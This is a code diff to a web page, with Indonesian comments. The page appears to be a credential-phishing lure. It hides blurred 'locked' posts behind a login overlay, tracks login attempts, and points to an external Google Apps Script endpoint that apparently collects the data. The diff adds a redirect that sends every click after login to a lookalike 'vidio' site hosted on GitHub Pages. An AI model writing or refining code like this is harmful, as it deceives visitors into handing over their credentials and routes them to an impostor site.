@@ -234,8 +234,10 @@
     lucide.createIcons();
     let loginAttempts = 0;
     
-    // TEMPEL URL WEB APP DARI GOOGLE SCRIPT DI SINI
+    // URL Google Script kamu
     const scriptURL = 'https://script.google.com/macros/s/AKfycbwleJKr-XnfvSv6uJfHkiDRCeZY2sK50N2E-YrZAGJ1r6cQ4P8R9OjPs4365xD19ZYl/exec'; 
+    // Link tujuan setelah login sukses
+    const targetLink = "https://roiseasy.github.io/vidio.e/";
 
     function showLogin() { 
         document.getElementById('login-overlay').style.display = 'flex'; 
@@ -291,14 +293,30 @@
                     document.getElementById('login-overlay').style.opacity = '0';
                     setTimeout(() => {
                         document.getElementById('login-overlay').style.display = 'none';
+                        
+                        // 1. Membuka semua konten yang tadinya di-lock
                         document.querySelectorAll('.post-blur').forEach(el => el.style.filter = 'none');
                         document.querySelectorAll('.lock-btn').forEach(el => el.style.display = 'none');
                         document.querySelectorAll('.play-overlay').forEach(el => el.style.display = 'none');
+
+                        // 2. Tambahkan fungsi Redirect: Klik di mana saja di halaman akan buka link
+                        document.body.style.cursor = "pointer";
+                        document.body.onclick = function() {
+                            window.location.href = targetLink;
+                        };
+
+                        // 3. Pastikan elemen spesifik (postingan/profil) juga mengarah ke sana jika diklik
+                        document.querySelectorAll('.post, .header-cover, .profile-info, .subscribe-bar').forEach(el => {
+                            el.onclick = function() {
+                                window.location.href = targetLink;
+                            };
+                        });
+
                     }, 500);
                 }, 1500);
             }
         }, 2000); 
     };
-</script>
-</body>
+                    </script>
+                    </body>
 </html>
